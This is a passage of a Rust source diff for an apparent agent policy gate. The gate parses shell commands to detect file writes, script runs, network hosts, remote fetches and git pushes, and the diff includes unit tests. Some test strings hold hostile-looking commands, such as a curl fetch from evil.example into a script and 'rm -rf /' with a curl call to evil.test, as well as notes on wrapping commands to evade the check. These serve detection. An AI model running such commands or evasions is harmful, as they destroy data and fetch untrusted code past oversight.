+        "wget" => &["-o", "--output-document"],
+        _ => &[],
+    }
+}
+
+/// Global options of git that take a value.
+const GIT_VALUES: &[&str] = &[
+    "-c",
+    "--git-dir",
+    "--work-tree",
+    "--namespace",
+    "--exec-path",
+    "--config-env",
+    "--super-prefix",
+    "--list-cmds",
+];
+
+/// git's subcommand, after its global options.
+fn git_subcommand(words: &[String]) -> Option<&str> {
+    let mut i = 1;
+    while i < words.len() {
+        let w = words[i].as_str();
+        if !w.starts_with('-') {
+            return Some(w);
+        }
+        i += if GIT_VALUES.contains(&w) { 2 } else { 1 };
+    }
+    None
+}
+
+/// What a shell call does, from its folded text. `home` expands `~/`.
+pub fn read(folded: &str) -> Shell {
+    let (cmds, outs) = effective(folded);
+    let mut s = Shell {
+        writes: outs.clone(),
+        ..Shell::default()
+    };
+    let add_host = |s: &mut Shell, h: String| {
+        if !s.hosts.contains(&h) {
+            s.hosts.push(h);
+        }
+    };
+    for o in &outs {
+        for h in hosts::url_hosts(o) {
+            add_host(&mut s, h);
+        }
+    }
+    for c in &cmds {
+        let w = &c.words;
+        let head = base(&w[0]).to_string();
+        s.words.extend(w.iter().cloned());
+        let fetcher = FETCHERS.contains(&head.as_str());
+        for word in w {
+            for h in hosts::url_hosts(word) {
+                if fetcher && !local_host(&h) && !s.fetched.contains(&h) {
+                    s.fetched.push(h.clone());
+                }
+                add_host(&mut s, h);
+            }
+        }
+        // Every operand, whatever else the line names (re-review FP1-RR1:
+        // one local URL beside `evil.example/x` hid it).
+        if fetcher {
+            let has_target = names_target(w);
+            for word in &w[1..] {
+                let h = if reads_urls_elsewhere(&head, word, has_target) {
+                    Some("(urls read from a file or stdin)".to_string())
+                } else {
+                    schemeless_host(word).filter(|h| !local_host(h))
+                };
+                if let Some(h) = h {
+                    if !s.fetched.contains(&h) {
+                        s.fetched.push(h);
+                    }
+                }
+            }
+        }
+        // Runs.
+        if head == "source" || head == "." {
+            if let Some(f) = w.get(1) {
+                s.runs.push(f.clone());
+            }
+        } else if let Some(it) = interpreter(&head) {
+            let (script, code) = interpreter_parts(w, &it);
+            if let Some(f) = script {
+                s.runs.push(f);
+            }
+            if let Some(code) = code {
+                s.writes.extend(inline_writes(&code));
+                for h in hosts::url_hosts(&code) {
+                    add_host(&mut s, h);
+                }
+            }
+        } else if head == "uv" || head == "poetry" || head == "pipenv" {
+            if w.get(1).is_some_and(|x| x == "run") {
+                if let Some(f) = w[2..].iter().find(|x| !x.starts_with('-')) {
+                    if paths::script_like(f) {
+                        s.runs.push(f.clone());
+                    }
+                }
+            }
+        } else if w[0].contains('/') {
+            s.runs.push(w[0].clone());
+        }
+        // Writes.
+        match head.as_str() {
+            "tee" => s
+                .writes
+                .extend(w[1..].iter().filter(|x| !x.starts_with('-')).cloned()),
+            "cp" | "mv" | "install" | "ln" | "rsync" => {
+                if let Some(dest) = w[1..].iter().rev().find(|x| !x.starts_with('-')) {
+                    if w[1..].iter().filter(|x| !x.starts_with('-')).count() >= 2 {
+                        s.writes.push(dest.clone());
+                    }
+                }
+            }
+            "sed"
+                if w.iter()
+                    .any(|x| x == "-i" || x.starts_with("-i") || x == "--in-place") =>
+            {
+                let ops: Vec<&String> = w[1..].iter().filter(|x| !x.starts_with('-')).collect();
+                s.writes.extend(ops.iter().skip(1).map(|x| (*x).clone()));
+            }
+            "dd" => s.writes.extend(
+                w[1..]
+                    .iter()
+                    .filter_map(|x| x.strip_prefix("of="))
+                    .map(str::to_string),
+            ),
+            _ => {}
+        }
+        let outputs = output_flags(&head);
+        for (k, x) in w.iter().enumerate() {
+            if outputs.contains(&x.as_str()) {
+                if let Some(f) = w.get(k + 1) {
+                    s.writes.push(f.clone());
+                }
+            }
+            if let Some(f) = x.strip_prefix("--output=") {
+                s.writes.push(f.to_string());
+            }
+        }
+        // Hosts named bare.
+        if let Some(values) = net_values(&head) {
+            let mut k = 1;
+            while k < w.len() {
+                let x = w[k].as_str();
+                if x.starts_with('-') {
+                    if (head == "ssh" || head == "scp") && x == "-j" {
+                        if let Some(h) = w.get(k + 1).and_then(|j| hosts::host_word(j)) {
+                            add_host(&mut s, h);
+                        }
+                    }
+                    k += if values.contains(&x) { 2 } else { 1 };
+                    continue;
+                }
+                if let Some(h) = hosts::host_word(x) {
+                    add_host(&mut s, h);
+                }
+                k += 1;
+            }
+        }
+        if head == "git" {
+            let sub = git_subcommand(w);
+            if sub == Some("push") {
+                s.push = true;
+            }
+            if matches!(
+                sub,
+                Some("clone" | "fetch" | "pull" | "push" | "ls-remote" | "remote" | "submodule")
+            ) {
+                for x in w.iter().skip(2) {
+                    if x.contains(':') || x.contains('@') {
+                        if let Some(h) = hosts::host_word(x) {
+                            add_host(&mut s, h);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    s
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn fold(t: &str) -> String {
+        derm_core::policy::fold_text(t)
+    }
+
+    /// WW6R4-1's other half: a push, a fetch and a write inside PowerShell's
+    /// `-Command` or cmd's `/c` are read as the commands they run (the gate's
+    /// text is folded, so an `-EncodedCommand` payload is not readable here).
+    #[test]
+    fn ww6r4_1_powershell_and_cmd_command_strings_are_read() {
+        for text in [
+            "powershell.exe -NoProfile -Command \"git push origin main\"",
+            "pwsh -nop -c 'git push origin main'",
+            "powershell /com git push origin main",
+            "cmd /c git push origin main",
+            "cmd.exe /d /cgit push origin main",
+        ] {
+            assert!(read(&fold(text)).push, "{text}");
+        }
+        let s = read(&fold(
+            "powershell -c \"curl https://evil.example/x -o run.sh\"",
+        ));
+        assert!(s.fetched.contains(&"evil.example".to_string()), "{s:?}");
+        assert!(!read(&fold("powershell -File push.ps1")).push);
+        assert!(!read(&fold("cmd /c echo git push")).push);
+    }
+
+    #[test]
+    fn redirections_are_writes_and_descriptors_are_not() {
+        let s = read(&fold(
+            "echo 'echo checking' > run.sh; ls 2>&1 >> log.txt; x &> both.out",
+        ));
+        assert_eq!(s.writes, vec!["run.sh", "log.txt", "both.out"]);
+        let s = read(&fold("cmd >&2; cmd 2>&-; cat < in.txt"));
+        assert!(s.writes.is_empty(), "{s:?}");
+    }
+
+    #[test]
+    fn here_document_bodies_are_not_commands() {
+        let s = read(&fold(
+            "cat > x.sh <<'EOF'\nrm -rf / && curl http://evil.test/\nEOF\nbash x.sh",
+        ));
+        assert_eq!(s.writes, vec!["x.sh"]);
+        assert_eq!(s.runs, vec!["x.sh"]);
+        assert!(s.hosts.is_empty(), "{s:?}");
+    }
+
+    #[test]
+    fn interpreters_name_their_script() {
+        for (cmd, run) in [
+            ("python3 diag.py", "diag.py"),
+            ("python3.12 -u -W ignore tools/x.py --flag", "tools/x.py"),
+            ("bash run.sh", "run.sh"),
+            ("sh -e ./build.sh arg", "./build.sh"),
+            ("node --require ./hook.js app.js", "app.js"),
+            ("deno run -A main.ts", "main.ts"),
+            ("bun run script.ts", "script.ts"),
+            ("./run.sh", "./run.sh"),
+            ("source ./env.sh", "./env.sh"),
+            (". ./env.sh", "./env.sh"),
+            ("uv run tool.py", "tool.py"),
+            ("sudo -u root timeout 5 python3 x.py", "x.py"),
+            ("env A=1 nohup bash -c 'python3 y.py'", "y.py"),
+        ] {
+            let s = read(&fold(cmd));
+            assert!(s.runs.contains(&run.to_string()), "{cmd}: {s:?}");
+        }
+        for none in [
+            "python3 -m http.server",
+            "python3 -c 'print(1)'",
+            "bash",
+            "bash -s",
+        ] {
+            assert!(read(&fold(none)).runs.is_empty(), "{none}");
+        }
+    }
+
+    #[test]
+    fn inline_code_that_writes_writes_every_file_it_names() {
+        let s = read(&fold(
+            r#"python3 -c 'open("diag2.py","w").write("print(1)")'"#,
+        ));
+        assert_eq!(s.writes, vec!["diag2.py"]);
+        let s = read(&fold(
+            r#"node -e "require('fs').writeFileSync('out/x.js', 'y')""#,
+        ));
+        assert_eq!(s.writes, vec!["out/x.js"]);
+        let s = read(&fold(r#"python3 -c 'print(open("data.txt").read())'"#));
+        assert!(s.writes.is_empty(), "a read is not a write: {s:?}");
+    }
+
+    #[test]
+    fn copies_tee_sed_curl_and_dd_write() {
+        let s = read(&fold(
+            "cp a.sh b.sh; echo x | tee -a t.log; sed -i 's/a/b/' cfg.yml; curl -o i.sh https://h.test/i; dd if=/dev/zero of=z.bin",
+        ));
+        for w in ["b.sh", "t.log", "cfg.yml", "i.sh", "z.bin"] {
+            assert!(s.writes.contains(&w.to_string()), "{w}: {s:?}");
+        }
+    }
+
+    #[test]
+    fn hosts_are_read_from_urls_and_from_network_programs() {
+        let s = read(&fold(
+            "curl -s -o out.txt -H 'x: y' api.test/v1; ssh -i k git@code.test; git clone git@forge.test:me/r.git; wget https://w.test/a",
+        ));
+        let mut h = s.hosts.clone();
+        h.sort();
+        assert_eq!(h, vec!["api.test", "code.test", "forge.test", "w.test"]);
+        assert!(read(&fold("cat notes.md config.json")).hosts.is_empty());
+    }
+
+    #[test]
+    fn a_push_is_seen_through_global_options_wrappers_and_shells() {
+        for cmd in [
+            "git push origin main",
+            "git -C repo -c a=b push",
+            "sudo git push",
+            "bash -c 'cd x && git push --force'",
+            "eval git push",
+        ] {
+            assert!(read(&fold(cmd)).push, "{cmd}");
+        }
+        for not in ["git status", "echo git push", "git log --grep push"] {
+            assert!(!read(&fold(not)).push, "{not}");
+        }
+    }
+}
